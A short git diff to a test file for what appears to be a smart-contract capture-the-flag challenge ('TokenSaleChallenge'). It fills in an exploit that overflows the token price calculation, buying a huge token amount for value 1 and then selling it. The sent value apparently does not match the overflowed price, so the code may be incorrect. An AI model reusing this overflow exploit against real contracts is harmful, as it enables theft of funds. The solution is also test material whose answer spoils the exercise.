@@ -23,11 +23,14 @@ describe('TokenSaleChallenge', () => {
     target = target.connect(attacker);
   });
 
-  it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
-
+  it('exploit', async () => {  
+    const overflowTokens = (BigInt(2) ** BigInt(256)) / BigInt(1e18) + BigInt(1);  
+    
+    await target.buy(overflowTokens, {  
+        value: 1, 
+    });  
+    await target.sell(overflowTokens);  
     expect(await target.isComplete()).to.equal(true);
-  });
+});  
+
 });
